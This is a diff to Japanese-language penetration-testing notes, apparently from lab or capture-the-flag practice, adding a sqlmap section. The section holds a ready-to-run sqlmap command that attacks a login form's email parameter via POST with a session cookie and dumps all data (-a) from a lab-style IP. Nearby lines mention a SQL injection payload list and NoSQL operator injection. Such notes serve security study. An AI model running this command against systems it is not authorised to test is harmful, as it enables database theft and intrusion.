@@ -165,6 +165,22 @@ https://github.com/payloadbox/sql-injection-payload-list/raw/refs/heads/master/I
 
 intruder 等で使って弱点を探る。
 
+## sqlmap
+
+email パラメータに SQLi 脆弱性がある場合
+
+```shell
+sqlmap -u "http://10.10.199.72/user_login.php" \
+--method POST \
+--data "email=aaa&password=bbb" \
+--cookie "PHPSESSID=lfam149vv8q8ct03i4msqgpu1f" \
+-p "email" -a \
+--exclude-sysdbs \
+--sql-query \
+--parse-errors \
+--batch -v 3
+```
+
 ## NoSQL
 
 ### 演算子インジェクション
